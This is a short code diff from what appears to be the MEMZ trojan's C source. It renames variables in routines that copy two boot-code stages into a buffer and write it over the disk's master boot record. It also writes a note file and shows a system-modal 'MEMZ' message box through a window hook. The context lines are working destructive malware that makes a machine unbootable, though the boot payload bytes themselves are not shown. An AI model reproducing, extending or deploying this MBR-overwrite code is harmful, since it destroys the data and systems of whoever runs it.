@@ -86,10 +86,10 @@ STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
 
 	// Join the two code parts together
 	int i = 0;
-	for (; i < STAGE1_MBR_LEN; i++)
-		*(bootcode + i) = *(STAGE1_MBR + i);
-	for (i = 0; i < STAGE2_MBR_LEN; i++)
-		*(bootcode + i + 0x1fe) = *(STAGE2_MBR + i);
+	for (; i < mbrStage1Len; i++)
+		*(bootcode + i) = *(mbrStage1 + i);
+	for (i = 0; i < mbrStage2Len; i++)
+		*(bootcode + i + 0x1fe) = *(mbrStage2 + i);
 
 	DWORD wb;
 	if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
@@ -102,7 +102,7 @@ STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
 	if (note == INVALID_HANDLE_VALUE)
 		ExitProcess(4);
 
-	if (!WriteFile(note, msg, msg_len, &wb, NULL))
+	if (!WriteFile(note, Note, NoteLen, &wb, NULL))
 		ExitProcess(5);
 
 	CloseHandle(note);
@@ -277,7 +277,7 @@ void killWindowsInstant() {
 
 DWORD WINAPI ripMessageThread(LPVOID parameter) {
 	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
-	MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], "MEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
+	MessageBoxA(NULL, (LPCSTR)KillMessages[random() % KillMessagesLen], "MEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
 	UnhookWindowsHookEx(hook);
 
 	return 0;
